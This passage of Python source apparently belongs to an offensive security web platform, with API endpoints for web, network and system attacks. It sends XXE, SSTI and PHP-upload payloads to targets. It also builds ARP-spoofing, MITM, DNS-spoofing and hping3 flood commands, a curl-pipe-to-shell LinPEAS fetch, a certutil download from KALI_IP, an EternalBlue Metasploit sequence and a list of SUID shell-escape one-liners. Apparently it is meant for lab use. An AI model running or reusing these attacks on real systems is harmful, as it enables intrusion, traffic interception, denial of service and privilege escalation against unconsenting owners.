    return {"scan_id": scan_id, "target": req.target, "tool": "ssrf",
            "vulnerable": any(f["severity"] not in ("INFO",) for f in findings),
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── XXE ───────────────────────────────────────────────────────
@app.post("/api/scan/xxe")
async def xxe_scan(req: ScanRequest, user=Depends(verify_token)):
    xxe_payload = ('<?xml version="1.0"?><!DOCTYPE foo '
                   '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                   '<root><data>&xxe;</data></root>')
    endpoints = ["/","/api","/upload","/import","/xml","/soap","/xmlrpc.php"]
    findings = []
    for endpoint in endpoints[:5]:
        url = req.target.rstrip("/") + endpoint
        try:
            res = await run_tool(["curl","-sk","--max-time","5","-X","POST",
                "-H","Content-Type: application/xml","-d",xxe_payload,url], timeout=10)
            out = res.get("output","")
            if "root:x:" in out or ("root:" in out and "/bin/" in out):
                findings.append({"detail": f"XXE confirmed at {endpoint} — /etc/passwd returned",
                    "severity": "CRITICAL", "cvss": "9.1", "cve": "N/A",
                    "cwe": "CWE-611", "cwe_name": "XXE",
                    "owasp": "A03:2021", "remediation": "Disable XML external entity processing."})
        except Exception:
            pass
    if not findings:
        findings.append({"detail": "No XXE detected across common XML endpoints", "severity": "INFO",
            "cvss": "0.0", "cve": "N/A", "cwe": "CWE-611", "cwe_name": "XXE",
            "owasp": "A03:2021", "remediation": "Test with authenticated XML endpoints."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "xxe", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "xxe",
            "vulnerable": any(f["severity"] not in ("INFO",) for f in findings),
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── CLICKJACKING ──────────────────────────────────────────────
@app.post("/api/scan/clickjacking")
async def clickjacking_scan(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["curl","-sk","--max-time","10","-I",req.target], timeout=15)
    headers = result.get("output","").lower()
    has_xfo = "x-frame-options" in headers
    has_csp = "frame-ancestors" in headers
    findings = []
    if not has_xfo and not has_csp:
        findings.append({"detail": "Clickjacking: no X-Frame-Options or CSP frame-ancestors header",
            "severity": "MEDIUM", "cvss": "6.1", "cve": "N/A",
            "cwe": "CWE-1021", "cwe_name": "Clickjacking",
            "owasp": "A05:2021", "remediation": "Add: Content-Security-Policy: frame-ancestors 'self'"})
    else:
        findings.append({"detail": f"Clickjacking protection present (XFO={has_xfo}, CSP={has_csp})",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-1021", "cwe_name": "Clickjacking Protection",
            "owasp": "A05:2021", "remediation": "Protection is in place."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "clickjacking", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "clickjacking",
            "vulnerable": not has_xfo and not has_csp,
            "findings": findings, "total": len(findings),
            "raw_output": result.get("output",""),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── HTTP VERB TAMPERING ───────────────────────────────────────
@app.post("/api/scan/verbtamper")
async def verbtamper_scan(req: ScanRequest, user=Depends(verify_token)):
    methods = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","TRACE","HEAD"]
    dangerous = {"PUT","DELETE","PATCH","TRACE"}
    findings = []
    allowed = []
    for method in methods:
        try:
            res = await run_tool(["curl","-sk","--max-time","5","-X",method,"-I",req.target], timeout=10)
            m = re.search(r"HTTP/[\d.]+ (\d+)", res.get("output",""))
            if m:
                status = int(m.group(1))
                if status not in [405,501,400,0]:
                    allowed.append({"method": method, "status": status})
                    if method in dangerous:
                        findings.append({"detail": f"Dangerous method {method} allowed (HTTP {status})",
                            "severity": "HIGH" if method in ("PUT","DELETE") else "MEDIUM",
                            "cvss": "7.5", "cve": "N/A",
                            "cwe": "CWE-749", "cwe_name": "Exposed Method",
                            "owasp": "A05:2021", "remediation": f"Disable {method} in server config."})
        except Exception:
            pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "verbtamper", req.target, {"output": str(allowed)})
    return {"scan_id": scan_id, "target": req.target, "tool": "verbtamper",
            "vulnerable": len(findings) > 0, "allowed_methods": allowed,
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── PARAMETER POLLUTION ───────────────────────────────────────
@app.post("/api/scan/pollution")
async def pollution_scan(req: ScanRequest, user=Depends(verify_token)):
    params = ["id","user","page","search","q","name","token","action","type","ref"]
    findings = []
    polluted = []
    for param in params[:6]:
        url = f"{req.target}?{param}=SAFE_VALUE&{param}=POLLUTED_INJECT"
        try:
            res = await run_tool(["curl","-sk","--max-time","5",url], timeout=10)
            out = res.get("output","")
            if "POLLUTED_INJECT" in out and "SAFE_VALUE" in out:
                polluted.append(param)
                findings.append({"detail": f"HTTP Parameter Pollution: {param} — both values reflected",
                    "severity": "MEDIUM", "cvss": "5.3", "cve": "N/A",
                    "cwe": "CWE-235", "cwe_name": "Parameter Pollution",
                    "owasp": "A03:2021", "remediation": "Accept only one value per parameter."})
        except Exception:
            pass
    if not findings:
        findings.append({"detail": "No parameter pollution detected", "severity": "INFO",
            "cvss": "0.0", "cve": "N/A", "cwe": "CWE-235", "cwe_name": "Parameter Pollution",
            "owasp": "A03:2021", "remediation": "Test with more parameters."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "pollution", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "pollution",
            "vulnerable": len(findings) > 0, "polluted": polluted,
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── IDOR ──────────────────────────────────────────────────────
@app.post("/api/scan/idor")
async def idor_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    tested = []
    base = req.target.rstrip("/")
    pairs = [("/user/1","/user/2"),("/users/1","/users/2"),("/api/user/1","/api/user/2"),
             ("/profile/1","/profile/2"),("/order/1","/order/2"),("/document/1","/document/2")]
    for p1, p2 in pairs:
        try:
            r1 = _req_lib.get(base+p1, timeout=5, verify=False, allow_redirects=False)
            r2 = _req_lib.get(base+p2, timeout=5, verify=False, allow_redirects=False)
            tested.append({"path": p1, "status": r1.status_code})
            if r1.status_code == 200 and r2.status_code == 200 and len(r1.text) > 50 and len(r1.text) != len(r2.text):
                findings.append({"detail": f"Potential IDOR: {p1} and {p2} both 200 with different content",
                    "severity": "HIGH", "cvss": "8.1", "cve": "N/A",
                    "cwe": "CWE-639", "cwe_name": "IDOR",
                    "owasp": "A01:2021", "remediation": "Verify server-side ownership before returning data."})
        except Exception:
            pass
    try:
        r = _req_lib.get(req.target, timeout=5, verify=False)
        if re.search(r'/(user|order|account|profile|id)/[0-9]{1,6}["\'/]', r.text, re.IGNORECASE):
            findings.append({"detail": "Sequential numeric IDs in source — IDOR risk",
                "severity": "MEDIUM", "cvss": "6.5", "cve": "N/A",
                "cwe": "CWE-639", "cwe_name": "IDOR", "owasp": "A01:2021",
                "remediation": "Replace sequential IDs with UUIDs."})
    except Exception:
        pass
    if not findings:
        findings.append({"detail": "No IDOR indicators found", "severity": "INFO",
            "cvss": "0.0", "cve": "N/A", "cwe": "CWE-639", "cwe_name": "IDOR",
            "owasp": "A01:2021", "remediation": "Test with authenticated user sessions."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "idor", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "idor",
            "vulnerable": any(f["severity"] in ("HIGH","CRITICAL") for f in findings),
            "findings": findings, "total": len(findings), "tested": tested,
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── SSTI ──────────────────────────────────────────────────────
@app.post("/api/scan/ssti")
async def ssti_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    tested = 0
    payloads = [("{{7*7}}","49"),("${7*7}","49"),("<%= 7*7 %>","49"),("#{7*7}","49"),("*{7*7}","49")]
    params = ["q","search","query","name","id","template","view","msg","text","page"]
    for payload, expected in payloads:
        for param in params[:5]:
            try:
                r = _req_lib.get(req.target, params={param: payload}, timeout=5, verify=False)
                tested += 1
                if expected in r.text:
                    findings.append({"detail": f"SSTI: param '{param}' with '{payload}' returned '{expected}'",
                        "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                        "cwe": "CWE-94", "cwe_name": "SSTI",
                        "owasp": "A03:2021", "remediation": "Never pass user input to template engines."})
            except Exception:
                pass
    if not findings:
        findings.append({"detail": f"No SSTI detected ({tested} combinations tested)",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-94", "cwe_name": "SSTI", "owasp": "A03:2021",
            "remediation": "Test more template engine payloads manually."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "ssti", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "ssti",
            "vulnerable": any(f["severity"] in ("HIGH","CRITICAL") for f in findings),
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── FILE UPLOAD ────────────────────────────────────────────────
@app.post("/api/scan/fileupload")
async def fileupload_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    tested = []
    base = req.target.rstrip("/")
    upload_paths = ["/upload","/uploads","/upload.php","/file-upload","/api/upload",
                    "/DVWA/vulnerabilities/upload/","/profile/upload","/avatar"]
    for path in upload_paths:
        try:
            r = _req_lib.get(base+path, timeout=5, verify=False, allow_redirects=True)
            if r.status_code not in (200,301,302,403):
                continue
            tested.append({"path": path, "status": r.status_code})
            if r.status_code == 200 and ('type="file"' in r.text.lower() or "multipart" in r.text.lower()):
                findings.append({"detail": f"File upload form at {path} — test for unrestricted upload",
                    "severity": "HIGH", "cvss": "8.8", "cve": "N/A",
                    "cwe": "CWE-434", "cwe_name": "Unrestricted File Upload",
                    "owasp": "A05:2021", "remediation": "Validate file type server-side. Store uploads outside webroot."})
                try:
                    ru = _req_lib.post(base+path,
                        files={"file": ("shell.php5", b"<?php echo 'UPLOAD_TEST'; ?>", "application/octet-stream")},
                        timeout=5, verify=False)
                    if ru.status_code in (200,201) and "success" in ru.text.lower():
                        findings.append({"detail": f"CRITICAL: Server accepted PHP file at {path}",
                            "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                            "cwe": "CWE-434", "cwe_name": "RCE via Upload",
                            "owasp": "A05:2021", "remediation": "Block PHP/JSP uploads immediately."})
                except Exception:
                    pass
        except Exception:
            pass
    if not findings:
        findings.append({"detail": f"No upload endpoints found ({len(upload_paths)} paths tested)",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-434", "cwe_name": "File Upload", "owasp": "A05:2021",
            "remediation": "Test upload with authenticated session."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "fileupload", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "fileupload",
            "vulnerable": any(f["severity"] in ("HIGH","CRITICAL") for f in findings),
            "findings": findings, "total": len(findings), "tested_endpoints": tested,
            "timestamp": datetime.datetime.utcnow().isoformat()}



# ══════════════════════════════════════════════════════════════
#  PROMPTS 3, 4, 5 — Network, System/Exploit, Cloud
# ══════════════════════════════════════════════════════════════

# ── NETWORK REQUEST MODEL ─────────────────────────────────────
class NetworkRequest(BaseModel):
    target:    str = ""
    interface: str = "eth0"
    gateway:   str = ""
    duration:  int = 10
    port:      int = 0
    protocol:  str = "tcp"

class PrivEscRequest(BaseModel):
    target:   str = ""
    lhost:    str = ""
    lport:    int = 4444
    platform: str = "linux"

class CloudRequest(BaseModel):
    target:     str = ""
    bucket:     str = ""
    region:     str = "us-east-1"
    access_key: str = ""
    secret_key: str = ""


# ══════════════════════════════════════════════════════════════
#  PROMPT 3 — NETWORK ATTACKS
# ══════════════════════════════════════════════════════════════

@app.post("/api/network/scan")
async def network_scan(req: NetworkRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    if not host:
        return {"error": "Target required"}
    result = await run_tool(["nmap", "-sV", "-sC", "-T4", "--open",
        "-p", "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443",
        host], timeout=120)
    out = result.get("output", "")
    ports = []
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+open\s+(.+)", line.strip())
        if m:
            port, proto, service = m.groups()
            parts = service.split(None, 1)
            ports.append({"port": int(port), "proto": proto, "service": parts[0],
                "version": parts[1].strip() if len(parts) > 1 else ""})
    findings = []
    risky = {"21":"FTP (plaintext)","23":"Telnet (plaintext)","139":"NetBIOS","445":"SMB","3389":"RDP","5900":"VNC"}
    for p in ports:
        if str(p["port"]) in risky:
            findings.append({"detail": f"{risky[str(p['port'])]} open on port {p['port']} — network attack surface",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                "cwe": "CWE-200", "cwe_name": "Open Network Service",
                "owasp": "A05:2021", "remediation": f"Firewall port {p['port']}. Disable if unused."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "network_scan", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "nmap_network",
            "ports": ports, "findings": findings, "total_open": len(ports),
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/network/arp")
async def network_arp(req: NetworkRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    # ARP scan to discover live hosts
    result = await run_tool(["nmap", "-sn", "-PR", host or "192.168.56.0/24"], timeout=60)
    out = result.get("output", "")
    hosts = []
    for line in out.splitlines():
        ip_m = re.search(r"Nmap scan report for (.+)", line)
        mac_m = re.search(r"MAC Address: ([0-9A-F:]+)\s+\((.+)\)", line)
        if ip_m:
            hosts.append({"ip": ip_m.group(1).strip(), "mac": "", "vendor": ""})
        if mac_m and hosts:
            hosts[-1]["mac"] = mac_m.group(1)
            hosts[-1]["vendor"] = mac_m.group(2)
    findings = []
    if len(hosts) > 1:
        findings.append({"detail": f"ARP scan discovered {len(hosts)} live hosts — network mapped",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-200", "cwe_name": "Network Enumeration",
            "owasp": "A05:2021",
            "remediation": "Enable dynamic ARP inspection (DAI) on managed switches. Use 802.1X port authentication."})
    arp_cmd = f"arpspoof -i {req.interface} -t {host} {req.gateway}" if host and req.gateway else f"arpspoof -i {req.interface} {host}"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "arp_scan", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "arp_scan",
            "hosts_discovered": hosts, "findings": findings, "total": len(hosts),
            "arp_spoof_cmd": arp_cmd,
            "mitm_cmd": f"arpspoof -i {req.interface} -t {host} {req.gateway} & arpspoof -i {req.interface} -t {req.gateway} {host}" if host and req.gateway else "Set target and gateway first",
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/network/mitm")
async def network_mitm(req: NetworkRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    findings = []
    # Check if IP forwarding is enabled
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            ip_fwd = f.read().strip()
        if ip_fwd == "0":
            findings.append({"detail": "IP forwarding disabled — enable before MITM: echo 1 > /proc/sys/net/ipv4/ip_forward",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-300", "cwe_name": "MITM Setup",
                "owasp": "A08:2021", "remediation": "Enable IP forwarding for MITM attacks."})
        else:
            findings.append({"detail": "IP forwarding ENABLED — system ready for MITM attacks",
                "severity": "HIGH", "cvss": "8.1", "cve": "N/A",
                "cwe": "CWE-300", "cwe_name": "MITM Ready",
                "owasp": "A08:2021", "remediation": "Disable when not testing: echo 0 > /proc/sys/net/ipv4/ip_forward"})
    except Exception:
        ip_fwd = "unknown"
    # Check for ettercap
    ettercap_result = await run_tool(["which", "ettercap"], timeout=5)
    has_ettercap = bool(ettercap_result.get("output","").strip())
    # Check for mitmproxy
    mitmproxy_result = await run_tool(["which", "mitmproxy"], timeout=5)
    has_mitmproxy = bool(mitmproxy_result.get("output","").strip())
    commands = {
        "enable_forwarding": "echo 1 > /proc/sys/net/ipv4/ip_forward",
        "arp_spoof_target": f"arpspoof -i {req.interface} -t {host} {req.gateway}" if host and req.gateway else "arpspoof -i eth0 -t TARGET_IP GATEWAY_IP",
        "arp_spoof_gateway": f"arpspoof -i {req.interface} -t {req.gateway} {host}" if host and req.gateway else "arpspoof -i eth0 -t GATEWAY_IP TARGET_IP",
        "ettercap_mitm": f"ettercap -T -q -i {req.interface} -M arp:remote /{host}// /{req.gateway}//" if host and req.gateway else "ettercap -T -q -i eth0 -M arp:remote /TARGET// /GATEWAY//",
        "ssl_strip": f"mitmproxy --mode transparent -p 8080" if has_mitmproxy else "pip install mitmproxy first",
        "capture_traffic": f"tcpdump -i {req.interface} -w /tmp/capture.pcap host {host}" if host else f"tcpdump -i {req.interface} -w /tmp/capture.pcap",
    }
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "mitm", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "mitm",
            "ip_forwarding": ip_fwd, "ettercap_available": has_ettercap,
            "mitmproxy_available": has_mitmproxy, "commands": commands,
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/network/sniff")
async def network_sniff(req: NetworkRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    duration = min(req.duration, 30)
    cap_file = f"/tmp/sniff_{uuid.uuid4().hex[:8]}.pcap"
    filt = f"host {host}" if host else "not broadcast and not multicast"
    cmd = ["tcpdump", "-i", req.interface, "-c", "100", "-w", cap_file, filt, "-nn"]
    result = await run_tool(cmd, timeout=duration + 5)
    out = result.get("output", "")
    # Read summary
    read_result = await run_tool(["tcpdump", "-r", cap_file, "-nn", "-q", "-c", "50"], timeout=15)
    summary = read_result.get("output", "")
    packets = []
    for line in summary.splitlines()[:20]:
        if "IP" in line or "ARP" in line:
            packets.append(line.strip())
    findings = []
    if "password" in summary.lower() or "pass=" in summary.lower():
        findings.append({"detail": "Cleartext password detected in captured traffic",
            "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
            "cwe": "CWE-319", "cwe_name": "Cleartext Transmission",
            "owasp": "A02:2021", "remediation": "Use TLS/HTTPS for all communications."})
    if "HTTP" in summary or "GET /" in summary or "POST /" in summary:
        findings.append({"detail": "Unencrypted HTTP traffic captured — credentials may be exposed",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-319", "cwe_name": "Cleartext HTTP",
            "owasp": "A02:2021", "remediation": "Enforce HTTPS. Use HSTS."})
    findings.append({"detail": f"Captured {len(packets)} packets on {req.interface} — saved to {cap_file}",
        "severity": "INFO", "cvss": "0.0", "cve": "N/A",
        "cwe": "CWE-200", "cwe_name": "Packet Capture",
        "owasp": "A02:2021", "remediation": "Use encrypted protocols. Enable network monitoring."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "sniff", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "tcpdump",
            "interface": req.interface, "cap_file": cap_file,
            "packets_sample": packets, "findings": findings, "total": len(findings),
            "raw_output": summary[:1000], "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/network/flood")
async def network_flood(req: NetworkRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    if not host:
        return {"error": "Target IP required"}
    duration = min(req.duration, 10)
    port = req.port or 80
    proto = req.protocol.lower()
    findings = []
    # Dry-run: just generate the command, don't actually flood
    if proto == "syn":
        cmd_str = f"hping3 -S --flood -p {port} {host}"
        findings.append({"detail": f"SYN flood command ready for {host}:{port} — sends TCP SYN packets at max rate",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-400", "cwe_name": "SYN Flood DoS",
            "owasp": "A05:2021", "remediation": "Enable SYN cookies. Use rate limiting and firewall rules."})
    elif proto == "udp":
        cmd_str = f"hping3 --udp --flood -p {port} {host}"
        findings.append({"detail": f"UDP flood command ready for {host}:{port}",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-400", "cwe_name": "UDP Flood DoS",
            "owasp": "A05:2021", "remediation": "Rate-limit UDP traffic. Use ingress filtering."})
    elif proto == "icmp":
        cmd_str = f"hping3 --icmp --flood {host}"
        findings.append({"detail": f"ICMP flood command ready for {host}",
            "severity": "MEDIUM", "cvss": "5.3", "cve": "N/A",
            "cwe": "CWE-400", "cwe_name": "ICMP Flood",
            "owasp": "A05:2021", "remediation": "Block ICMP at perimeter. Rate-limit ping responses."})
    else:
        cmd_str = f"hping3 -S --flood -p {port} {host}"
    # Test connectivity only (safe)
    ping_result = await run_tool(["ping", "-c", "3", "-W", "2", host], timeout=15)
    ping_out = ping_result.get("output", "")
    alive = "0% packet loss" in ping_out or "1 received" in ping_out or "2 received" in ping_out or "3 received" in ping_out
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "flood", req.target, {"output": cmd_str})
    return {"scan_id": scan_id, "target": req.target, "tool": "hping3",
            "command": cmd_str, "protocol": proto, "port": port,
            "target_alive": alive, "findings": findings,
            "warning": "This command will cause DoS. Use ONLY in authorised lab environments.",
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/network/dns_spoof")
async def network_dns_spoof(req: NetworkRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    findings = []
    # Check if dnschef is available
    dnschef_result = await run_tool(["which", "dnschef"], timeout=5)
    has_dnschef = bool(dnschef_result.get("output","").strip())
    # Check if responder is available
    resp_result = await run_tool(["which", "responder"], timeout=5)
    has_responder = bool(resp_result.get("output","").strip())
    findings.append({"detail": f"DNS spoofing tools: dnschef={'available' if has_dnschef else 'not installed'}, responder={'available' if has_responder else 'not installed'}",
        "severity": "INFO", "cvss": "0.0", "cve": "N/A",
        "cwe": "CWE-350", "cwe_name": "DNS Spoofing",
        "owasp": "A08:2021", "remediation": "Enable DNSSEC. Use encrypted DNS (DoH/DoT)."})
    commands = {
        "dnschef_all": f"dnschef --fakeip {req.gateway or 'KALI_IP'} --interface {req.interface}",
        "dnschef_specific": f"dnschef --fakeip {req.gateway or 'KALI_IP'} --fakedomains {host or 'target.com'} --interface {req.interface}",
        "responder": f"responder -I {req.interface} -rdwv",
        "arp_then_dns": f"arpspoof -i {req.interface} -t TARGET GATEWAY & dnschef --fakeip KALI_IP",
        "install_dnschef": "pip3 install dnschef" if not has_dnschef else "dnschef is installed",
    }
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dns_spoof", req.target, {"output": str(commands)})
    return {"scan_id": scan_id, "target": req.target, "tool": "dnschef",
            "dnschef_available": has_dnschef, "responder_available": has_responder,
            "commands": commands, "findings": findings,
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  PROMPT 4 — SYSTEM / EXPLOITATION
# ══════════════════════════════════════════════════════════════

@app.post("/api/exploit/privesc_linux")
async def exploit_privesc_linux(req: PrivEscRequest, user=Depends(verify_token)):
    findings = []
    # Run local LinPEAS checks (on Kali itself as demo)
    checks = []
    # SUID binaries
    suid_result = await run_tool(["find", "/", "-perm", "-4000", "-type", "f", "-ls"], timeout=20)
    suid_out = suid_result.get("output", "")
    suid_bins = [l.split()[-1] for l in suid_out.splitlines() if l.strip()]
    gtfo_bins = ["/usr/bin/vim", "/usr/bin/python3", "/usr/bin/perl", "/usr/bin/find",
                 "/usr/bin/nmap", "/usr/bin/awk", "/usr/bin/less", "/usr/bin/bash",
                 "/usr/bin/cp", "/usr/bin/mv", "/bin/bash", "/usr/bin/python"]
    for b in suid_bins:
        if any(b.endswith(g.split("/")[-1]) for g in gtfo_bins):
            findings.append({"detail": f"SUID GTFOBin: {b} — can be used for privilege escalation",
                "severity": "CRITICAL", "cvss": "9.3", "cve": "N/A",
                "cwe": "CWE-269", "cwe_name": "SUID PrivEsc",
                "owasp": "A01:2021", "remediation": f"Remove SUID from {b}: chmod u-s {b}"})
    checks.append({"check": "SUID Binaries", "found": len(suid_bins), "gtfobins": [b for b in suid_bins if any(b.endswith(g.split("/")[-1]) for g in gtfo_bins)]})
    # Writable /etc/passwd
    passwd_result = await run_tool(["ls", "-la", "/etc/passwd"], timeout=5)
    passwd_out = passwd_result.get("output", "")
    if "w" in passwd_out[4:11] if passwd_out else False:
        findings.append({"detail": "/etc/passwd is world-writable — add root user for PrivEsc",
            "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
            "cwe": "CWE-732", "cwe_name": "Writable passwd",
            "owasp": "A01:2021", "remediation": "chmod 644 /etc/passwd"})
    # Sudo -l
    sudo_result = await run_tool(["sudo", "-l", "-n"], timeout=5)
    sudo_out = sudo_result.get("output", "")
    if "NOPASSWD" in sudo_out:
        findings.append({"detail": f"NOPASSWD sudo rights found: {sudo_out[:200]}",
            "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
            "cwe": "CWE-269", "cwe_name": "Sudo PrivEsc",
            "owasp": "A01:2021", "remediation": "Review /etc/sudoers. Remove NOPASSWD entries."})
    checks.append({"check": "Sudo Rights", "output": sudo_out[:300]})
    # Cron jobs
    cron_result = await run_tool(["cat", "/etc/crontab"], timeout=5)
    cron_out = cron_result.get("output", "")
    checks.append({"check": "Crontab", "output": cron_out[:500]})
    # Kernel version
    kernel_result = await run_tool(["uname", "-r"], timeout=5)
    kernel = kernel_result.get("output", "").strip()
    findings.append({"detail": f"Kernel: {kernel} — check for local kernel exploits (Dirty COW, etc.)",
        "severity": "MEDIUM", "cvss": "6.5", "cve": "N/A",
        "cwe": "CWE-269", "cwe_name": "Kernel PrivEsc",
        "owasp": "A06:2021", "remediation": "Keep kernel patched. Run: searchsploit linux kernel " + kernel[:10]})
    linpeas_cmd = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "privesc_linux", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "linpeas",
            "kernel": kernel, "suid_count": len(suid_bins), "checks": checks,
            "findings": findings, "total": len(findings),
            "linpeas_cmd": linpeas_cmd,
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/privesc_win")
async def exploit_privesc_win(req: PrivEscRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else ""
    findings = []
    # Check if target is Windows via nmap
    if host:
        nmap_result = await run_tool(["nmap", "-O", "-T4", "-p", "135,445,3389", host], timeout=60)
        nmap_out = nmap_result.get("output", "")
        is_windows = "Windows" in nmap_out or "microsoft" in nmap_out.lower()
        if is_windows:
            findings.append({"detail": f"Windows target detected at {host} — WinPEAS applicable",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-269", "cwe_name": "Windows PrivEsc",
                "owasp": "A01:2021", "remediation": "Run WinPEAS after obtaining shell."})
        # Check MS17-010
        msf_result = await run_tool(["nmap", "--script", "smb-vuln-ms17-010", "-p", "445", host], timeout=60)
        msf_out = msf_result.get("output", "")
        if "VULNERABLE" in msf_out:
            findings.append({"detail": "EternalBlue (MS17-010) VULNERABLE — SYSTEM-level RCE possible",
                "severity": "CRITICAL", "cvss": "9.8", "cve": "CVE-2017-0144",
                "cwe": "CWE-94", "cwe_name": "EternalBlue",
                "owasp": "A06:2021", "remediation": "Apply MS17-010 patch. Disable SMBv1."})
    commands = {
        "winpeas_download": "certutil -urlcache -f http://KALI_IP/winpeasx64.exe winpeas.exe",
        "winpeas_run": "winpeas.exe > winpeas_out.txt",
        "serve_winpeas": f"python3 -m http.server 80  # on Kali in /usr/share/peass/",
        "check_unquoted": 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows" | findstr /i /v """',
        "check_alwaysinstall": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "check_autologon": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "token_impersonation": "use exploit/windows/local/ms16_075_reflection_juicy  # in MSF after getting shell",
        "eternal_blue": f"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {host}\nset LHOST {req.lhost or 'KALI_IP'}\nrun",
    }
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "privesc_win", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "winpeas",
            "findings": findings, "total": len(findings),
            "commands": commands, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/suid")
async def exploit_suid(req: PrivEscRequest, user=Depends(verify_token)):
    result = await run_tool(["find", "/", "-perm", "-4000", "-type", "f", "-ls",
        "2>/dev/null"], timeout=20)
    out = result.get("output", "")
    # GTFObins list
    gtfobins = {
        "bash": "bash -p",
        "python": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
        "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
        "vim": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        "find": "find . -exec /bin/sh -p \\; -quit",
        "nmap": "nmap --interactive  # then !sh",
        "perl": "perl -e 'exec \"/bin/sh\";'",
        "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "less": "less /etc/passwd  # then !sh",
        "nano": "nano  # then ^R^X and reset; sh 1>&0 2>&0",
        "cp": "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
        "env": "env /bin/sh -p",
